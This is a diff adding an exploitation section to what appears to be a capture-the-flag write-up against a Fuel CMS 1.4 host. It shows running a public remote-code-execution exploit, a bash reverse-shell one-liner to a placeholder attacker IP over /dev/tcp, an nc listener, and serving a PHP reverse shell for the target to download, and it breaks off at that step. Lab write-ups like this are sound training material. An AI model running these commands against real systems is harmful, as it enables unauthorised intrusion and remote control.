@@ -56,9 +56,49 @@ That works ! We are connect as admin user.
 
 ## Exploitation
 
+From the administration interface of the CMS, i meet some troubles for change anything.. 
 
+In the same time, I checked if an exploit for Fuel CMS 1.4 exists. I found this follow :
 
----
+```bash
+$ searchsploit fuel cms
+[...]
+$ searchsploit -m 47138
+```
+
+I just delete the proxy variable and delete the proxy argument in the requests.get.
+
+```bash
+#       proxy = {"http":"http://127.0.0.1:8080"}
+        r = requests.get(burp0_url)
+```
+
+Run this exploit with the "id" remote command. 
+
+```bash
+$ python 47138.py
+[...]
+cmd:id
+[...]
+cmd:id
+systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">
+[...]
+```
+
+We can try to send a command to set up a reverse shell. Don't forget to set a nc listener ( example : $ nc -lnvp 4444).
+
+```bash
+cmd:"bash -c 'exec bash -i &>/dev/tcp/<my_ip>/<listener_port> <&1'"
+``̀
+
+That does not works. So let's try to set up a webserver on local and execute a wget command from the target to my machine for get a php reverse shell file.
+
+```bash
+# Local (we need to have our reverse shell file on the current directory)
+$ python3 -m http.server 80
+```
 
 ## User flag
 
